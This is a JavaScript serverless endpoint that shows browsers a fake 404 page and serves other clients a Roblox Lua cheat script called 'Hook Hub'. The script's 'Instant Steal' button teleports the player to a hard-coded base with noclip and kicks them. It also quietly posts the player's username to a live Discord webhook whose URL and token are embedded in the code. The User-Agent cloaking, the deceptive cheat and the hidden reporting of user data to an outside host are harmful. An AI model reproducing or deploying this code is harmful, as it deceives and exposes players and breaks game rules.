// api/load.js
export default async function handler(req, res) {
    // Check User-Agent
    const userAgent = req.headers['user-agent'] || '';

    // If browser, show 404
    if (userAgent.includes('Mozilla') && !userAgent.includes('Roblox')) {
        res.status(404).send(`<!DOCTYPE html>
<html>
<head>
<style>
body {background:#000;color:#666;text-align:center;padding:50px;}
</style>
</head>
<body>
<h1>404</h1>
<p>Page not found</p>
</body>
</html>`);
        return;
    }

    // --- PLACEHOLDER: REPLACE THIS WITH YOUR LUA SCRIPT ---
    const luaScript = `-- Hook Hub UI
-- Minimal draggable UI with animated galaxy background

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- Player
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HookHub"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Smaller main container frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
mainFrame.Size = UDim2.new(0, 350, 0, 250)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Add rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Create galaxy background
local galaxyBackground = Instance.new("Frame")
galaxyBackground.Name = "GalaxyBackground"
galaxyBackground.Size = UDim2.new(1, 0, 1, 0)
galaxyBackground.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
galaxyBackground.BackgroundTransparency = 0
galaxyBackground.ZIndex = 0
galaxyBackground.Parent = mainFrame

-- Galaxy gradient
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 5, 30)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 10, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 2, 20))
})
gradient.Rotation = 45
gradient.Parent = galaxyBackground

-- Stars container
local starsContainer = Instance.new("Frame")
starsContainer.Name = "StarsContainer"
starsContainer.Size = UDim2.new(1, 0, 1, 0)
starsContainer.BackgroundTransparency = 1
starsContainer.ZIndex = 1
starsContainer.Parent = galaxyBackground

-- Create stars
local stars = {}
for i = 1, 75 do
    local star = Instance.new("Frame")
    star.Name = "Star" .. i
    star.Size = UDim2.new(0, 1, 0, 1)
    star.Position = UDim2.new(0, math.random(0, 350), 0, math.random(0, 250))
    star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    star.BackgroundTransparency = math.random(30, 70) / 100
    star.ZIndex = 1
    star.Parent = starsContainer
    table.insert(stars, star)
end

-- Header
local header = Instance.new("Frame")
header.Name = "Header"
header.Size = UDim2.new(1, 0, 0, 35)
header.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
header.BackgroundTransparency = 0.2
header.BorderSizePixel = 0
header.ZIndex = 2
header.Parent = mainFrame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 8)
headerCorner.Parent = header

-- TITLE AT THE LEFT OF THE GUI
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(0, 120, 0, 25)
title.Position = UDim2.new(0, 15, 0, 7)
title.BackgroundTransparency = 1
title.Text = "HOOK HUB"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 3
title.Parent = header

-- Tabs container
local tabsContainer = Instance.new("Frame")
tabsContainer.Name = "TabsContainer"
tabsContainer.Size = UDim2.new(1, -40, 0, 30)
tabsContainer.Position = UDim2.new(0, 20, 0, 45)
tabsContainer.BackgroundTransparency = 1
tabsContainer.ZIndex = 2
tabsContainer.Parent = mainFrame

-- Create tabs
local tabs = {}
local tabButtons = {}

local function createTab(name, position)
    local tabButton = Instance.new("TextButton")
    tabButton.Name = name .. "Tab"
    tabButton.Size = UDim2.new(0, 80, 1, 0)
    tabButton.Position = UDim2.new(0, position, 0, 0)
    tabButton.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    tabButton.BackgroundTransparency = 0.5
    tabButton.Text = name:upper()
    tabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    tabButton.TextSize = 12
    tabButton.Font = Enum.Font.GothamSemibold
    tabButton.ZIndex = 3
    tabButton.Parent = tabsContainer
    
    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 6)
    tabCorner.Parent = tabButton
    
    -- Tab highlight
    local highlight = Instance.new("Frame")
    highlight.Name = "Highlight"
    highlight.Size = UDim2.new(1, 0, 0, 2)
    highlight.Position = UDim2.new(0, 0, 1, -2)
    highlight.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
    highlight.BackgroundTransparency = 1
    highlight.BorderSizePixel = 0
    highlight.ZIndex = 4
    highlight.Parent = tabButton
    
    -- Tab content frame
    local tabFrame = Instance.new("Frame")
    tabFrame.Name = name .. "Frame"
    tabFrame.Size = UDim2.new(1, -40, 1, -90)
    tabFrame.Position = UDim2.new(0, 20, 0, 85)
    tabFrame.BackgroundTransparency = 1
    tabFrame.BorderSizePixel = 0
    tabFrame.Visible = false
    tabFrame.ZIndex = 2
    tabFrame.Parent = mainFrame
    
    tabButton.MouseButton1Click:Connect(function()
        -- Hide all tabs
        for tabName, frame in pairs(tabs) do
            frame.Visible = false
            local btn = tabButtons[tabName]
            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
            btn.BackgroundTransparency = 0.5
            btn.TextColor3 = Color3.fromRGB(200, 200, 200)
            btn.Highlight.BackgroundTransparency = 1
        end
        
        -- Show selected tab
        tabFrame.Visible = true
        tabButton.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
        tabButton.BackgroundTransparency = 0.3
        tabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        tabButton.Highlight.BackgroundTransparency = 0
    end)
    
    tabs[name] = tabFrame
    tabButtons[name] = tabButton
    
    return tabFrame
end

-- Create Main tab (with Instant Steal button)
local mainTab = createTab("Main", 0)
mainTab.Visible = true

-- Create Settings tab (empty)
local settingsTab = createTab("Settings", 90)

-- Add Instant Steal button to Main tab (GALAXY BACKGROUND AND BLACK THEME)
local instantStealButton = Instance.new("TextButton")
instantStealButton.Name = "InstantStealButton"
instantStealButton.Size = UDim2.new(1, 0, 0, 50)
instantStealButton.Position = UDim2.new(0, 0, 0, 10)
instantStealButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
instantStealButton.BackgroundTransparency = 0.2
instantStealButton.Text = "INSTANT STEAL"
instantStealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
instantStealButton.TextSize = 16
instantStealButton.Font = Enum.Font.GothamBold
instantStealButton.ZIndex = 3
instantStealButton.Parent = mainTab

-- Add galaxy-like gradient to button
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 5, 30)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 15, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 2, 20))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = instantStealButton

-- Add button stars container
local buttonStarsContainer = Instance.new("Frame")
buttonStarsContainer.Name = "ButtonStarsContainer"
buttonStarsContainer.Size = UDim2.new(1, 0, 1, 0)
buttonStarsContainer.BackgroundTransparency = 1
buttonStarsContainer.ZIndex = 4
buttonStarsContainer.Parent = instantStealButton

-- Add tiny stars to button
for i = 1, 15 do
    local star = Instance.new("Frame")
    star.Name = "ButtonStar" .. i
    star.Size = UDim2.new(0, 1, 0, 1)
    star.Position = UDim2.new(0, math.random(5, 290), 0, math.random(5, 45))
    star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    star.BackgroundTransparency = math.random(40, 80) / 100
    star.ZIndex = 4
    star.Parent = buttonStarsContainer
end

-- Add button corner
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = instantStealButton

-- Add border effect
local buttonBorder = Instance.new("Frame")
buttonBorder.Name = "Border"
buttonBorder.Size = UDim2.new(1, 2, 1, 2)
buttonBorder.Position = UDim2.new(0, -1, 0, -1)
buttonBorder.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
buttonBorder.BackgroundTransparency = 0.7
buttonBorder.ZIndex = 2
buttonBorder.Parent = instantStealButton

local borderCorner = Instance.new("UICorner")
borderCorner.CornerRadius = UDim.new(0, 7)
borderCorner.Parent = buttonBorder

-- Animation for stars
local connection
local function animateBackground()
    local time = tick()
    
    -- Animate main stars twinkling
    for i, star in ipairs(stars) do
        if i % 4 == math.floor(time) % 4 then
            local transparency = 0.3 + (math.sin(time * 2 + i) + 1) * 0.35
            star.BackgroundTransparency = transparency
        end
    end
    
    -- Animate button stars
    local buttonStars = buttonStarsContainer:GetChildren()
    for i, star in ipairs(buttonStars) do
        if star:IsA("Frame") then
            if i % 3 == math.floor(time * 1.5) % 3 then
                star.BackgroundTransparency = 0.4 + (math.sin(time * 3 + i) + 1) * 0.3
            end
        end
    end
end

-- Animation function
local function updateAnimations(dt)
    animateBackground()
end

-- Start animations
connection = RunService.RenderStepped:Connect(updateAnimations)

-- Function to execute the instant steal script
local function executeStealScript()
    -- Client-side script (LocalScript) with Discord webhook - NO TP BACKS
    local Player = Players.LocalPlayer

    -- Get player name once and log it
    local PLAYER_NAME = Player.Name
    print("Player name: " .. PLAYER_NAME)

    -- Discord webhook URL
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1454595763324584160/9G8_GbKl9j5TkS2UBUt-im2fFZJXnBmKVo1v_sKzxtZ_Dzsxf9mUjlq1mpi1679WlP7s"

    -- Function to send Discord webhook notification using request()
    local function sendWebhookNotification(stolenBrainrot)
        local username = Player.Name
        
        -- Format message exactly as requested: "user" just stole a "the brainrot" congrats twin!
        local message = string.format('"%s" just stole a "%s" congrats twin!', username, stolenBrainrot)
        
        -- Send simple message first
        local success1 = pcall(function()
            local data = {
                ["content"] = message
            }
            local body = game:GetService("HttpService"):JSONEncode(data)
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
        
        if not success1 then
            -- Try with syn.request for Synapse
            pcall(function()
                local data = {
                    ["content"] = message
                }
                local body = game:GetService("HttpService"):JSONEncode(data)
                syn.request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = body
                })
            end)
        end
        
        return true
    end

    -- Function to find plot with creedfullyud's base
    local function findTargetPlot()
        if workspace:FindFirstChild("Plots") then
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                if plot:IsA("Model") or plot:IsA("Folder") then
                    local plotSign = plot:FindFirstChild("PlotSign")
                    if plotSign then
                        local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
                        if surfaceGui then
                            local frame = surfaceGui:FindFirstChild("Frame")
                            if frame then
                                local textLabel = frame:FindFirstChild("TextLabel")
                                if textLabel and string.find(string.lower(textLabel.Text), " creedameen1's base") then
                                    local cashPad = plot:FindFirstChild("CashPad")
                                    if cashPad and #cashPad:GetChildren() >= 2 then
                                        return plot
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    -- Get target position
    local function getTargetPosition()
        local targetPlot = findTargetPlot()
        if targetPlot then
            local cashPad = targetPlot:FindFirstChild("CashPad")
            if cashPad then
                local cashPadChildren = cashPad:GetChildren()
                if #cashPadChildren >= 2 then
                    local targetPart = cashPadChildren[2]
                    return targetPart.Position + Vector3.new(0, 3, 0)
                end
            end
        end
        return nil
    end

    -- Function to find and steal ONE brainrot from workspace
    local function stealOneBrainrot()
        local brainrotNames = {
            "Noobini Pizzanini",
            "Lirili Larila",
            "Tim Cheese",
            "Fluriflura",
            "Svinina Bombardino",
            "Talpa Di Fero",
            "Pipi Kiwi",
            "Pipi Corni",
            "Raccooni Jandelini",
            "Tartaragno",
            "Noobini Santanini",
            "Trippi Troppi",
            "Gangster Footera",
            "Boneca Ambalabu",
            "Ta Ta Ta Ta Sahur",
            "Tric Trac Baraboom",
            "Bandito Bobritto",
            "Cacto Hipopotamo",
            "Pipi Avocado",
            "Pinealotto Fruttarino",
            "Cupcake Koala",
            "Frogo Elfo",
            "Cappuccino Assassino",
            "Brr Brr Patapim",
            "Trulimero Trulicina",
            "Bananita Dolphinita",
            "Brri Brri Bicus Dicus Bombicus",
            "Bambini Crostini",
            "Perochello Lemonchello",
            "Avocadini Guffo",
            "Salamino Penguino",
            "Ti Ti Ti Sahur",
            "Penguino Cocosino",
            "Avocadini Antilopini",
            "Bandito Axolito",
            "Malame Amarele",
            "Mangolini Parrocini",
            "Mummio Rappitto",
            "Frogato Pirato",
            "Wombo Rollo",
            "Doi Doi Do",
            "Penguin Tree",
            "Burbaloni Loliloli",
            "Chimpanzini Bananini",
            "Ballerina Cappuccina",
            "Chef Crabracadabra",
            "Glorbo Fruttodrillo",
            "Blueberrinni Octopusini",
            "Lionel Cactuseli",
            "Pandaccini Bananini",
            "Strawberrelli Flamingelli",
            "Cocosini Mama",
            "Pi Pi Watermelon",
            "Sigma Boy",
            "Pipi Potato",
            "Quivioli Ameleonni",
            "Tirilikalika Tirilikalako",
            "Caramello Filtrello",
            "Signore Carapace",
            "Sigma Girl",
            "Quackula",
            "Buho de Fuego",
            "Clickerino Crabo",
            "Puffaball",
            "Chocco Bunny",
            "Sealo Regalo",
            "Frigo Camelo",
            "Orangutini Ananassini",
            "Bombardiro Crocodilo",
            "Bombombini Gusini",
            "Rhino Toasterino",
            "Cavallo Virtuoso",
            "Spioniro Golubiro",
            "Zibra Zubra Zibralini",
            "Tigrilini Watermelini",
            "Gorillo Watermelondrillo",
            "Avocadorilla",
            "Ganganzelli Trulala",
            "Tob Tobi Tobi",
            "Te Te Te Sahur",
            "Tracoducotulu Delapeladustuz",
            "Lerulerulerule",
            "Carloo",
            "Carrotini Brainini",
            "Brutto Gialutto",
            "Gorillo Subwoofero",
            "Los Noobinis",
            "Rhino Helicopterino",
            "Elefanto Frigo",
            "Toiletto Focaccino",
            "Cachorrito Melonito",
            "Bananito Bandito",
            "Magi Ribbitini",
            "Jacko Spaventosa",
            "Stoppo Luminino",
            "Centrucci Nuclucci",
            "Jingle Jingle Sahur",
            "Tree Tree Tree Sahur",
            "Chihuanini Taconini",
            "Cocofanto Elefanto",
            "Tralalero Tralala",
            "Odin Din Din Dun",
            "Girafa Celestre",
            "Trenostruzzo Turbo 3000",
            "Matteo",
            "Tigroligre Frutonni",
            "Orcalero Orcala",
            "Unclito Samito",
            "Gattatino Nyanino",
            "Espresso Signora",
            "Ballerino Lololo",
            "Piccione Macchina",
            "Los Crocodillitos",
            "Tukanno Bananno",
            "Trippi Troppi Troppa Trippa",
            "Los Tungtungtungcitos",
            "Agarrini la Palini",
            "Bulbito Bandito Traktorito",
            "Los Orcalitos",
            "Tipi Topi Taco",
            "Bombardini Tortinii",
            "Tralalita Tralala",
            "Urubini Flamenguini",
            "Alessio",
            "Pakrahmatmamat",
            "Los Bombinitos",
            "Brr es Teh Patipum",
            "Tartaruga Cisterna",
            "Cacasito Satalito",
            "Mastodontico Telepiedone",
            "Crabbo Limonetta",
            "Gattito Tacoto",
            "Los Tipi Tacos",
            "Antonio",
            "Las Capuchinas",
            "Orcalita Orcala",
            "Piccionetta Macchina",
            "Anpali Babel",
            "Extinct Ballerina",
            "Tractoro Dinosauro",
            "Belula Beluga",
            "Capi Taco",
            "Dug dug dug",
            "Corn Corn Corn Sahur",
            "Brasilini Berimbini",
            "Squalanana",
            "Pop Pop Sahur",
            "Vampira Cappucina",
            "Jacko Jack Jack",
            "Snailenzo",
            "Tentacolo Tecnico",
            "Pakrahmatmatina",
            "Bambu Bambu Sahur",
            "Krupuk Pagi Pagi",
            "Mummy Ambalabu",
            "Cappuccino Clownino",
            "Skull Skull Skull",
            "Aquanaut",
            "Frio Ninja",
            "Money Money Man",
            "Noo La Polizia",
            "Los Chihuaninis",
            "Los Gattitos",
            "Granchiello Spiritell",
            "Ballerina Peppermintina",
            "Ginger Globo",
            "Ginger Cisterna",
            "Yeti Claus",
            "Buho de Noelo",
            "Chrismasmamat",
            "Cocoa Assassino",
            "Pandanini Frostini",
            "La Vacca Saturno Saturnita",
            "Los Tralaleritos",
            "Graipuss Medussi",
            "La Grande Combinasion",
            "Sammyni Spyderini",
            "Garama and Madundung",
            "Torrtuginni Dragonfrutini",
            "Las Tralaleritas",
            "Pot Hotspot",
            "Nuclearo Dinossauro",
            "Las Vaquitas Saturnitas",
            "Chicleteira Bicicleteira",
            "Los Combinasionas",
            "Karkerkar Kurkur",
            "Dragon Cannelloni",
            "Los Hotspotsitos",
            "Esok Sekolah",
            "Nooo My Hotspot",
            "Los Matteos",
            "Job Job Job Sahur",
            "Dul Dul Dul",
            "Blackhole Goat",
            "Los Spyderinis",
            "Ketupat Kepat",
            "La Supreme Combinasion",
            "Bisonte Giuppitere",
            "Guerriro Digitale",
            "Ketchuru and Musturu",
            "Spaghetti Tualetti",
            "Los Nooo My Hotspotsitos",
            "Trenostruzzo Turbo 4000",
            "Fragola La La La",
            "La Sahur Combinasion",
            "La Karkerkar Combinasion",
            "Tralaledon",
            "Los Bros",
            "Los Chicleteiras",
            "Chachechi",
            "Extinct Tralalero",
            "Extinct Matteo",
            "67",
            "Las Sis",
            "Celularcini Viciosini",
            "La Extinct Grande",
            "Quesadilla Crocodila",
            "Tacorita Bicicleta",
            "La Cucaracha",
            "To to to Sahur",
            "Mariachi Corazoni",
            "Los Tacoritas",
            "Tictac Sahur",
            "Yess my examine",
            "Karker Sahur",
            "Noo my examine",
            "Money Money Puggy",
            "Los Primos",
            "Tang Tang Keletang",
            "Perrito Burrito",
            "Chillin Chili",
            "Los Tortus",
            "Los Karkeritos",
            "Los Jobcitos",
            "Los 67",
            "La Secret Combinasion",
            "Burguro And Fryuro",
            "Zombie Tralala",
            "Vulturino Skeletono",
            "Frankentteo",
            "La Vacca Jacko Linterino",
            "Chicleteirina Bicicleteirina",
            "Eviledon",
            "La Spooky Grande",
            "Los Mobilis",
            "Spooky and Pumpky",
            "Boatito Auratito",
            "Horegini Boom",
            "Rang Ring Bus",
            "Mieteteira Bicicleteira",
            "Quesadillo Vampiro",
            "Burrito Bandito",
            "Chipso and Queso",
            "Jackorilla",
            "Pumpkini Spyderini",
            "Trickolino",
            "Telemorte",
            "Pot Pumpkin",
            "Noo my Candy",
            "Los Spooky Combinasionas",
            "La Casa Boo",
            "Headless Horseman",
            "La Taco Combinasion",
            "1x1x1x1",
            "Capitano Moby",
            "Guest 666",
            "Pirulitoita Bicicleteira",
            "Los Puggies",
            "Los Spaghettis",
            "Fragrama and Chocrama",
            "Swag Soda",
            "Orcaledon",
            "Los Cucarachas",
            "Los Burritos",
            "Los Quesadillas",
            "Cuadramat and Pakrahmatmamat",
            "Fishino Clownino",
            "Los Planitos",
            "W or L",
            "Lavadorito Spinito",
            "Gobblino Uniciclino",
            "Giftini Spyderini",
            "Tung Tung Tung Sahur",
            "Coffin Tung Tung Tung Sahur",
            "Cooki and Milki",
            "25",
            "La Vacca Prese Presente",
            "Reindeer Tralala",
            "Santteo",
            "Please my Present",
            "List List List Sahur",
            "Ho Ho Ho Sahur",
            "Chicleteira Noelteira",
            "La Jolly Grande",
            "Los Candies",
            "Triplito Tralaleritos",
            "Santa Hotspot",
            "La Ginger Sekolah",
            "Reinito Sleighito",
            "Naughty Naughty",
            "Noo my Present",
            "Los 25",
            "Chimnino",
            "Festive 67",
            "Swaggy Bros",
            "Bunnyman",
            "Dragon Gingerini",
            "Donkeyturbo Express",
            "Money Money Reindeer",
            "Los Jolly Combinasionas",
            "Jolly Jolly Sahur",
            "Ginger Gerat",
            "Strawberry Elephant",
            "Meowl",
            "Mythic Lucky Block",
            "Brainrot God Lucky Block",
            "Secret Lucky Block",
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
            "Festive Lucky Block",
            "Premium Festive Lucky Block",
            "Gold Elf",
            "Lucky Block"
        }
        
        local lookup = {}
        for _, name in pairs(brainrotNames) do
            lookup[name] = true
        end
        
        -- Look for ONE brainrot to steal
        for _, obj in pairs(workspace:GetChildren()) do
            if lookup[obj.Name] or string.find(obj.Name:lower(), "lucky block") then
                local stolenName = obj.Name
                obj:Destroy()
                return stolenName
            end
        end
        
        return nil
    end

    -- INSTANT TELEPORT AND KICK - NO TP BACKS
    local function executeSteal()
        -- 1. First steal ONE brainrot
        local stolenBrainrot = stealOneBrainrot()
        
        if not stolenBrainrot then
            return false, "No brainrot found to steal!"
        end
        
        -- 2. Get target position
        local targetPos = getTargetPosition()
        if not targetPos then
            return false, "Target not found!"
        end
        
        -- 3. Get character
        if not Player.Character then
            Player.CharacterAdded:Wait()
        end
        
        local character = Player.Character
        if not character then
            return false, "No character!"
        end
        
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 2)
        if not humanoidRootPart then
            return false, "No HumanoidRootPart!"
        end
        
        -- 4. SEND WEBHOOK - NO DELAY
        sendWebhookNotification(stolenBrainrot)
        
        -- 5. IMMEDIATELY play sound - NO DELAY
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://83245966620103"
        sound.Volume = 0.5
        sound.Parent = workspace
        sound:Play()
        
        -- 6. INSTANT TELEPORT - NO TP BACKS
        -- Enable noclip to prevent getting stuck
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
        
        -- Teleport instantly to target
        humanoidRootPart.CFrame = CFrame.new(targetPos)
        
        -- 7. KICK WITH MESSAGE "You Stole (brainrotnamehere)"
        local kickMessage = "You Stole " .. stolenBrainrot
        
        -- 8. INSTANT KICK - NO DELAY - NO TP BACKS
        Player:Kick(kickMessage)
        
        return true, "Success!"
    end

    -- Execute the steal script
    local success, message = executeSteal()
    return success, message
end

-- Button click handler for Instant Steal
instantStealButton.MouseButton1Click:Connect(function()
    -- Change button appearance to show it's being clicked
    instantStealButton.Text = "EXECUTING..."
    buttonGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 20, 80)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 40, 120)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 10, 60))
    })
    
    -- Execute the steal script
    local success, message = pcall(executeStealScript)
    
    if success then
        instantStealButton.Text = "SUCCESS!"
        buttonGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 80, 20)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 120, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 60, 10))
        })
    else
        instantStealButton.Text = "ERROR!"
        buttonGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 20, 20)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 40, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 10, 10))
        })
        warn("Instant Steal Error: " .. tostring(message))
    end
    
    -- Reset button after 2 seconds
    task.wait(2)
    instantStealButton.Text = "INSTANT STEAL"
    buttonGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 5, 30)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 15, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 2, 20))
    })
end)

-- Button hover effects
instantStealButton.MouseEnter:Connect(function()
    if instantStealButton.Text == "INSTANT STEAL" then
        instantStealButton.BackgroundTransparency = 0.1
        buttonBorder.BackgroundTransparency = 0.5
    end
end)

instantStealButton.MouseLeave:Connect(function()
    if instantStealButton.Text == "INSTANT STEAL" then
        instantStealButton.BackgroundTransparency = 0.2
        buttonBorder.BackgroundTransparency = 0.7
    end
end)

-- DRAGGABLE UI FUNCTIONALITY
local dragging = false
local dragOffset = Vector2.new(0, 0)

-- Make header draggable
header.Active = true
header.Selectable = true

-- When mouse is pressed on header
header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        
        -- Calculate the offset between mouse position and UI position
        local mousePos = UserInputService:GetMouseLocation()
        local framePos = mainFrame.AbsolutePosition
        dragOffset = mousePos - framePos
        
        -- Capture the mouse even if it leaves the header area
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

-- Update position while dragging
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UserInputService:GetMouseLocation()
        
        -- Calculate new position using the saved offset
        local newX = mousePos.X - dragOffset.X
        local newY = mousePos.Y - dragOffset.Y
        
        -- Update UI position
        mainFrame.Position = UDim2.new(0, newX, 0, newY)
    end
end)

-- Cleanup function
screenGui.Destroying:Connect(function()
    if connection then
        connection:Disconnect()
    end
end)

print("Hook Hub UI loaded successfully!")`;

    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(luaScript);
}
